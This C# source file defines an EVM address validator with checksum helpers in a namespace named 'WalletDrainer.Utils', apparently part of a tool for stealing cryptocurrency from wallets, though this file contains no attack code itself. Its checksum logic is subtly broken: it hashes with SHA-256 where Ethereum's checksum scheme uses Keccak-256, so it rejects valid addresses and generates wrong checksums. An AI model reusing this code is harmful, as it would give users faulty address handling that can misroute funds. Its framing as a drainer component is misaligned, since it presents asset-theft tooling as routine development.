using System.Text.RegularExpressions;

namespace WalletDrainer.Utils;

public static partial class AddressValidator
{
    [GeneratedRegex(@"^0x[0-9a-fA-F]{40}$")]
    private static partial Regex EvmAddressPattern();

    public static bool IsValidEvmAddress(string address) =>
        EvmAddressPattern().IsMatch(address);

    public static bool IsChecksumValid(string address)
    {
        if (!IsValidEvmAddress(address))
            return false;

        string stripped = address[2..];
        bool hasUpper = stripped.Any(char.IsUpper);
        bool hasLower = stripped.Any(char.IsLower);

        if (!hasUpper || !hasLower)
            return true;

        string lower = stripped.ToLowerInvariant();
        byte[] hash = System.Security.Cryptography.SHA256.HashData(
            System.Text.Encoding.UTF8.GetBytes(lower));

        for (int i = 0; i < 40; i++)
        {
            int hashByte = hash[i / 2];
            int nibble = (i % 2 == 0) ? (hashByte >> 4) : (hashByte & 0xF);

            if (nibble >= 8 && char.IsLower(stripped[i]))
                return false;
            if (nibble < 8 && char.IsUpper(stripped[i]))
                return false;
        }

        return true;
    }

    public static string ToChecksumAddress(string address)
    {
        string stripped = address[2..].ToLowerInvariant();
        byte[] hash = System.Security.Cryptography.SHA256.HashData(
            System.Text.Encoding.UTF8.GetBytes(stripped));

        char[] result = new char[42];
        result[0] = '0';
        result[1] = 'x';

        for (int i = 0; i < 40; i++)
        {
            int hashByte = hash[i / 2];
            int nibble = (i % 2 == 0) ? (hashByte >> 4) : (hashByte & 0xF);
            result[i + 2] = nibble >= 8 ? char.ToUpper(stripped[i]) : stripped[i];
        }

        return new string(result);
    }
}
